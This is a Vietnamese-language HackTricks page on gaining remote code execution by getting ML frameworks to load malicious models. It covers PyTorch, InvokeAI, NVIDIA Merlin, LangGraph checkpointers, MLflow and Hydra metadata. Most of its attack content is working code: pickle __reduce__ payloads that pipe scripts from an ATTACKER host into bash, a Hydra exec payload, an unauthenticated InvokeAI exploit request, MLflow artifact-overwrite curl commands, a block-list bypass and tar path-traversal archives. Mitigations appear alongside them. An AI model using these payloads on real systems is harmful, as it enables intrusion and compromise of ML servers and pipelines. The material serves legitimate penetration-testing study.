# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Nạp mô hình để thực thi mã từ xa (RCE)

Các mô hình Machine Learning thường được chia sẻ dưới nhiều định dạng khác nhau, chẳng hạn như ONNX, TensorFlow, PyTorch, v.v. Các mô hình này có thể được nạp vào máy của nhà phát triển hoặc hệ thống production để sử dụng. Thông thường, mô hình không nên chứa mã độc, nhưng trong một số trường hợp, mô hình có thể được dùng để thực thi mã tùy ý trên hệ thống như một tính năng được thiết kế sẵn hoặc do lỗ hổng trong thư viện nạp mô hình.

Bảng sau liệt kê các lỗ hổng tiêu biểu thuộc nhóm này:

| **Framework / Công cụ**        | **Lỗ hổng (nếu có CVE)**                                                    | **Vector RCE**                                                                                                                           | **Tài liệu tham khảo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Giải tuần tự không an toàn trong* `torch.load` **(CVE-2025-32434)**                                                              | Pickle độc hại trong checkpoint mô hình dẫn đến thực thi mã (vượt qua cơ chế bảo vệ `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + tải xuống mô hình độc hại gây thực thi mã; RCE qua giải tuần tự Java trong API quản lý                                        | |
| **NVIDIA Merlin Transformers4Rec** | Giải tuần tự checkpoint không an toàn qua `torch.load` **(CVE-2025-23298)**                                           | Checkpoint không đáng tin cậy kích hoạt pickle reducer trong `load_model_trainer_states_from_checkpoint` → thực thi mã trong ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook mở rộng MessagePack không an toàn **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Khóa `filter` do người dùng kiểm soát chèn cú pháp SQL/JSON-path, `UNION SELECT` tạo hàng checkpoint giả, sau đó giải tuần tự `msgpack` nhập và gọi mã Python do kẻ tấn công chọn | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML không an toàn) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Nạp mô hình từ YAML sử dụng `yaml.unsafe_load` (thực thi mã) <br> Nạp mô hình có lớp **Lambda** sẽ chạy mã Python tùy ý          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (phân tích TFLite)                                                                                          | Mô hình `.tflite` được tạo đặc biệt kích hoạt tràn số nguyên → hỏng heap (có khả năng dẫn đến RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Nạp mô hình qua `joblib.load` sẽ thực thi pickle có payload `__reduce__` của kẻ tấn công                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` không an toàn) *đang tranh cãi*                                                                              | Mặc định, `numpy.load` cho phép mảng đối tượng được pickle – tệp `.npy/.npz` độc hại kích hoạt thực thi mã                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (duyệt đường dẫn) <br> **CVE-2024-5187** (duyệt tar)                                                    | Đường dẫn external-weights của mô hình ONNX có thể thoát khỏi thư mục (đọc tệp bất kỳ) <br> Tệp tar của mô hình ONNX độc hại có thể ghi đè tệp bất kỳ (dẫn đến RCE) | |
| ONNX Runtime (rủi ro thiết kế)  | *(Không có CVE)* Custom ops / luồng điều khiển ONNX                                                                                    | Mô hình có custom operator cần nạp mã native của kẻ tấn công; các đồ thị mô hình phức tạp lợi dụng logic để thực hiện các phép tính ngoài dự kiến   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (duyệt đường dẫn)                                                                                          | Dùng API nạp mô hình khi bật `--model-control` cho phép duyệt đường dẫn tương đối để ghi tệp (ví dụ: ghi đè `.bashrc` để dẫn đến RCE)    | |
| **GGML (định dạng GGUF)**      | **CVE-2024-25664 … 25668** (nhiều lỗi tràn heap)                                                                         | Tệp mô hình GGUF có cấu trúc sai gây tràn bộ đệm heap trong parser, cho phép thực thi mã tùy ý trên hệ thống nạn nhân                     | |
| **Keras (định dạng cũ)**   | *(Không có CVE mới)* Mô hình Keras H5 cũ                                                                                         | Mô hình HDF5 (`.h5`) độc hại có mã trong lớp Lambda vẫn thực thi khi nạp (Keras safe_mode không áp dụng cho định dạng cũ – “downgrade attack”) | |
| **Khác** (nói chung)        | *Lỗi thiết kế* – Tuần tự hóa Pickle                                                                                         | Nhiều công cụ ML (ví dụ: định dạng mô hình dựa trên pickle, Python `pickle.load`) sẽ thực thi mã tùy ý nhúng trong tệp mô hình nếu không có biện pháp giảm thiểu | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Siêu dữ liệu không đáng tin cậy được truyền vào `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Siêu dữ liệu/cấu hình mô hình do kẻ tấn công kiểm soát đặt `_target_` thành callable tùy ý (ví dụ: `builtins.exec`) → được thực thi trong quá trình nạp, kể cả với các định dạng “an toàn” (`.safetensors`, `.nemo`, `config.json` của repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ngoài ra, có một số mô hình dựa trên Python pickle, chẳng hạn như các mô hình được [PyTorch](https://github.com/pytorch/pytorch/security) sử dụng, có thể thực thi mã tùy ý trên hệ thống nếu không được nạp với `weights_only=True`. Vì vậy, mọi mô hình dựa trên pickle đều có thể đặc biệt dễ bị loại tấn công này, ngay cả khi không được liệt kê trong bảng trên.

### Siêu dữ liệu Hydra → RCE (vẫn hiệu quả với safetensors)

`hydra.utils.instantiate()` nhập và gọi bất kỳ `_target_` dạng dotted nào trong một đối tượng cấu hình/siêu dữ liệu. Khi các thư viện như Hugging Face Transformers truyền **siêu dữ liệu mô hình không đáng tin cậy** vào `instantiate()`, kẻ tấn công có thể cung cấp một callable và các đối số để chạy ngay trong quá trình nạp mô hình (không cần pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Ví dụ payload (hoạt động trong `model_config.yaml` của `.nemo`, `config.json` của repo hoặc `__metadata__` bên trong `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- Được kích hoạt trước khi khởi tạo model trong `restore_from/from_pretrained` của NeMo, các coders HuggingFace của uni2TS và loaders của FlexTok.
- Có thể bypass string block-list của Hydra bằng các đường dẫn import thay thế (ví dụ: `enum.bltns.eval`) hoặc các tên được ứng dụng phân giải (ví dụ: `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok cũng phân tích metadata dạng chuỗi bằng `ast.literal_eval`, cho phép gây DoS (làm CPU/bộ nhớ tăng vọt) trước khi gọi Hydra.

### 🆕  InvokeAI RCE qua `torch.load` (CVE-2024-12029)

`InvokeAI` là giao diện web mã nguồn mở phổ biến cho Stable-Diffusion. Các phiên bản **5.3.1 – 5.4.2** cung cấp REST endpoint `/api/v2/models/install`, cho phép người dùng tải xuống và load model từ các URL bất kỳ.<sup>[[1]](#references)</sup>

Bên trong, endpoint cuối cùng gọi:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Khi tệp được cung cấp là một **checkpoint PyTorch (`*.ckpt`)**, `torch.load` thực hiện **pickle deserialization**. Vì nội dung được lấy trực tiếp từ URL do người dùng kiểm soát, kẻ tấn công có thể nhúng một object độc hại có phương thức `__reduce__` tùy chỉnh vào checkpoint; phương thức này được thực thi **trong quá trình deserialization**, dẫn đến **remote code execution (RCE)** trên máy chủ InvokeAI.

Lỗ hổng được gán mã **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Hướng dẫn khai thác

1. Tạo một checkpoint độc hại:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Host `payload.ckpt` trên HTTP server do bạn kiểm soát (ví dụ: `http://ATTACKER/payload.ckpt`).
3. Kích hoạt endpoint dễ bị tấn công (không yêu cầu xác thực):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Khi InvokeAI tải tệp xuống, nó gọi `torch.load()` → gadget `os.system` chạy và kẻ tấn công chiếm được quyền thực thi mã trong ngữ cảnh của tiến trình InvokeAI.

Exploit có sẵn: module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` tự động hóa toàn bộ quy trình.<sup>[[3]](#references)</sup>

#### Điều kiện

•  InvokeAI 5.3.1-5.4.2 (cờ scan mặc định là **false**)
•  Kẻ tấn công có thể truy cập `/api/v2/models/install`
•  Tiến trình có quyền thực thi các lệnh shell

#### Biện pháp giảm thiểu

* Nâng cấp lên **InvokeAI ≥ 5.4.3** – bản vá đặt `scan=True` theo mặc định và quét malware trước khi giải tuần tự hóa.<sup>[[2]](#references)</sup>
* Khi tải checkpoint bằng lập trình, hãy dùng `torch.load(file, weights_only=True)` hoặc helper mới [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Áp dụng allow-list / chữ ký cho nguồn model và chạy dịch vụ với quyền tối thiểu.

> ⚠️ Hãy nhớ rằng **mọi** định dạng dựa trên Python pickle (bao gồm nhiều tệp `.pt`, `.pkl`, `.ckpt`, `.pth`) đều vốn không an toàn khi giải tuần tự hóa từ các nguồn không đáng tin cậy.

---

Ví dụ về biện pháp giảm thiểu tạm thời nếu bạn phải tiếp tục chạy các phiên bản InvokeAI cũ hơn phía sau reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE qua `torch.load` không an toàn (CVE-2025-23298)

Transformers4Rec của NVIDIA (thuộc Merlin) để lộ một trình tải checkpoint không an toàn, gọi trực tiếp `torch.load()` trên các đường dẫn do người dùng cung cấp. Vì `torch.load` dựa vào Python `pickle`, checkpoint do kẻ tấn công kiểm soát có thể thực thi mã tùy ý thông qua một reducer trong quá trình giải tuần tự hóa.<sup>[[5]](#references)</sup>

Đường dẫn dễ bị tấn công (trước khi sửa): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Vì sao điều này dẫn đến RCE: Trong Python pickle, một đối tượng có thể định nghĩa reducer (`__reduce__`/`__setstate__`) trả về một callable và các đối số. Callable sẽ được thực thi trong quá trình giải tuần tự hóa. Nếu có đối tượng như vậy trong checkpoint, nó sẽ chạy trước khi bất kỳ trọng số nào được sử dụng.

Ví dụ checkpoint độc hại tối giản:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Các vector phát tán và phạm vi ảnh hưởng:
- Checkpoint/model bị cài trojan, được chia sẻ qua repo, bucket hoặc registry artifact
- Pipeline tự động resume/deploy tự động tải checkpoint
- Việc thực thi diễn ra bên trong worker training/inference, thường với quyền cao (ví dụ: root trong container)

Khắc phục: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) thay `torch.load()` trực tiếp bằng một bộ giải tuần tự có giới hạn, sử dụng danh sách cho phép và được triển khai trong `transformers4rec/utils/serialization.py`. Loader mới xác thực kiểu dữ liệu/trường và ngăn các callable tùy ý được gọi trong quá trình tải.<sup>[[7]](#references)</sup>

Hướng dẫn phòng thủ dành riêng cho checkpoint PyTorch:
- Không unpickle dữ liệu không đáng tin cậy. Ưu tiên các định dạng không thực thi mã như [Safetensors](https://huggingface.co/docs/safetensors/index) hoặc ONNX khi có thể.
- Nếu bắt buộc phải dùng serialization của PyTorch, hãy đảm bảo `weights_only=True` (được hỗ trợ trong các phiên bản PyTorch mới hơn) hoặc dùng unpickler tùy chỉnh có danh sách cho phép, tương tự bản vá Transformers4Rec.<sup>[[4]](#references)</sup>
- Xác minh nguồn gốc/chữ ký của model và sandbox quá trình giải tuần tự (seccomp/AppArmor; người dùng không phải root; hạn chế FS và chặn lưu lượng mạng đi ra).
- Giám sát các tiến trình con bất thường do dịch vụ ML tạo ra khi tải checkpoint; theo dõi việc sử dụng `torch.load()`/`pickle`.

POC và các tham chiếu về phiên bản dễ bị tấn công/bản vá:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader trước bản vá, dễ bị tấn công: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC checkpoint độc hại: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader sau bản vá: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Ví dụ – tạo một model PyTorch độc hại

- Tạo model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Tải mô hình:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD của Tencent cung cấp endpoint `resnet` có giải tuần tự hóa dữ liệu do người dùng kiểm soát. ZDI xác nhận rằng kẻ tấn công từ xa có thể dụ nạn nhân tải một trang/tệp độc hại, khiến trang/tệp đó gửi một blob đã tuần tự hóa được tạo thủ công đến endpoint này và kích hoạt quá trình giải tuần tự hóa với quyền `root`, dẫn đến chiếm quyền hoàn toàn.

Luồng khai thác tương tự kiểu lạm dụng pickle thông thường:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Bất kỳ gadget nào có thể được gọi trong quá trình deserialization (constructor, `__setstate__`, callback của framework, v.v.) đều có thể bị weaponize theo cùng cách, bất kể dữ liệu được truyền qua HTTP, WebSocket hay một file được thả vào thư mục đang được theo dõi.



### LangGraph checkpointer SQLi → MessagePack RCE

Chuỗi tấn công này đáng chú ý vì attacker **không cần tải lên một file model độc hại**. Thay vào đó, ứng dụng cung cấp một **API lưu trạng thái cho AI agent** (`get_state_history(..., filter=...)`), và input của người dùng được đưa vào query builder của checkpointer.

#### 1. SQLi cấu trúc trong bộ lọc metadata

Một mẫu SQLite dễ bị tấn công có dạng:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Giá trị được bind sau đó, nhưng `query_key` được nối vào **chuỗi JSON path**, vì vậy ký tự `'` bên trong khóa dictionary sẽ thoát khỏi `'$.{query_key}'` và inject SQL. Bài học tương tự cũng áp dụng cho **JSON path, identifier, operator, `LIMIT` và trường TTL**: placeholder chỉ bảo vệ value, không bảo vệ cú pháp query có cấu trúc.

#### 2. `UNION SELECT` có thể nhắm đến các downstream sink, không chỉ đánh cắp dữ liệu

Query trả về `type` và các byte `checkpoint` đã được serialize, sau đó được xử lý như sau:

```python
self.serde.loads_typed((type, checkpoint))
```

Điều đó có nghĩa là SQLi trong mệnh đề `WHERE` có thể chèn một **hàng kết quả giả**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Nếu sau đó code phân tích cú pháp, giải tuần tự hóa, ghi hoặc thực thi bất kỳ cột nào được chọn, hãy ánh xạ các cột đó đến các sink tương ứng. Trong trường hợp này, hàng giả biến SQLi thành **deserialization do attacker kiểm soát**.

#### 3. Các extension hook không an toàn của MessagePack tương đương với code gadget

Đường xử lý `msgpack` của LangGraph sử dụng một custom extension hook để unpack một tuple lồng nhau và thực thi:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Vì vậy, một MessagePack extension object mã hóa thứ tương đương với `("os", "system", "id > /tmp/pwned")` sẽ import `os`, phân giải `system` rồi chạy lệnh. Khi đánh giá các AI framework, hãy kiểm tra **custom MessagePack/JSON/pickle revivers** để tìm dynamic imports, reflection hoặc arbitrary callable dispatch.

#### 4. Mẫu audit thực tế cho agent framework

Kiểm tra mọi user-controlled input đi đến:
- các API state history / memory / replay / checkpoint listing
- structured filter builders tạo SQL hoặc Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- các recovery path tin tưởng những hàng được persistence layer trả về

Chuỗi khai thác cụ thể này ảnh hưởng đến các triển khai LangGraph tự host dùng **SQLite** hoặc **Redis** checkpointer khi người dùng không đáng tin cậy có thể kiểm soát `filter`. Các phiên bản đã vá được nêu trong thông báo là `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` và `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Ghi đè artifact MLflow PyFunc dẫn đến pickle RCE

Một MLflow PyFunc được tạo từ `PythonModel` có thể lưu đối tượng đã serialize dưới dạng `python_model.pkl`. Metadata của model chỉ định `mlflow.pyfunc.model` làm loader, và phần triển khai của MLflow sử dụng tên tệp này cho Python model đã lưu. Do đó, quyền ghi vào artifact store có thể dẫn đến thực thi mã trong một ứng dụng khác sau này tải model.<sup>[[17]](#references)[[18]](#references)</sup>

Chuỗi khai thác hữu ích là **quyền ghi artifact → thay thế pickle → khiến inference consumer tải lại nó**. Với một experiment sử dụng root `mlflow-artifacts:/...` được proxy, hãy liệt kê experiment, run và đường dẫn artifact của model. Tracking server cung cấp `GET` và `PUT` trên `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Một reducer tối giản có thể thực thi lệnh ngay khi consumer unpickle artifact. Tạo payload bằng phiên bản Python được khai báo trong `MLmodel` giúp tránh các vấn đề tương thích.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Kích hoạt thao tác **tải model hiện có**, chẳng hạn như dự đoán, chấm điểm hoặc triển khai. Đừng huấn luyện lại trước vì việc huấn luyện có thể thay thế artifact độc hại bằng một model mới. Lỗi ứng dụng không chứng minh rằng khai thác thất bại: reducer trả về mã thoát dạng số nguyên của lệnh thay vì một model có thể sử dụng. Hãy bắt đầu bằng một side effect có thể quan sát được, chẳng hạn như ICMP hoặc HTTP callback, rồi thay bằng payload cuối cùng.<sup>[[20]](#references)</sup>

Trong quá trình đánh giá, hãy phân biệt quyền tạo run với quyền ghi đè artifact thuộc về run khác. Rà soát xác thực và quyền cập nhật theo từng run, kiểm tra các thay đổi bất ngờ đối với `python_model.pkl`, đồng thời xem nguồn gốc và tính toàn vẹn của model là một phần của ranh giới thực thi. Mã MLflow hiện tại cũng hỗ trợ đặt `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` và khuyến nghị dùng artifact models-from-code thay vì tải dữ liệu cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Các máy chủ model bị lộ và hạ tầng ML

Tải một model độc hại không phải là cách duy nhất để chạy mã trên hạ tầng ML. API gửi job, endpoint xác thực mã và thao tác kéo model từ registry của các dịch vụ AI tự lưu trữ có thể dẫn đến thực thi mã mà không cần bất kỳ tệp model nào. Xem [Các dịch vụ AI tự lưu trữ bị lộ](AI-Exposed-Self-Hosted-AI-Services.md).

## Model dẫn đến Path Traversal

Như đã đề cập trong [**bài đăng blog này**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), hầu hết định dạng model được các framework AI khác nhau sử dụng đều dựa trên archive, thường là `.zip`. Vì vậy, có thể lợi dụng các định dạng này để thực hiện tấn công path traversal, cho phép đọc các tệp tùy ý từ hệ thống tải model.<sup>[[16]](#references)</sup>

Ví dụ, với đoạn mã sau, bạn có thể tạo một model sẽ tạo tệp trong thư mục `/tmp` khi được tải:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Hoặc, với đoạn mã sau, bạn có thể tạo một mô hình sẽ tạo symlink đến thư mục `/tmp` khi được tải:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Chuyên sâu: giải tuần tự hóa Keras .keras và gadget hunting

Để xem hướng dẫn chuyên sâu về nội bộ .keras, RCE qua Lambda-layer, vấn đề import tùy ý trong phiên bản ≤ 3.8 và cách tìm gadget bên trong allowlist sau khi đã vá, hãy xem:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – "CVE-2024-12029 – InvokeAI: Giải tuần tự hóa dữ liệu không đáng tin cậy"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit vá lỗi InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Tài liệu module Metasploit của Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – các cân nhắc về bảo mật đối với torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: Đạt được thực thi mã từ xa trong NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Thông báo bảo mật ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit vá lỗi Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader dễ bị tấn công trước khi vá (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC checkpoint độc hại (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader sau khi vá (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers của Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Thực thi mã từ xa với các định dạng và thư viện AI/ML hiện đại](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Tài liệu Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit block-list của Hydra (cảnh báo về RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Từ SQLi đến RCE: Khai thác checkpointer của LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Chuyển hướng các lỗi Archive Slip thành bounty AI/ML giá trị cao](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Thông báo bảo mật của Snyk và proof of concept PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Mã nguồn MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API của MLflow – endpoint tải xuống và tải lên artifact](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
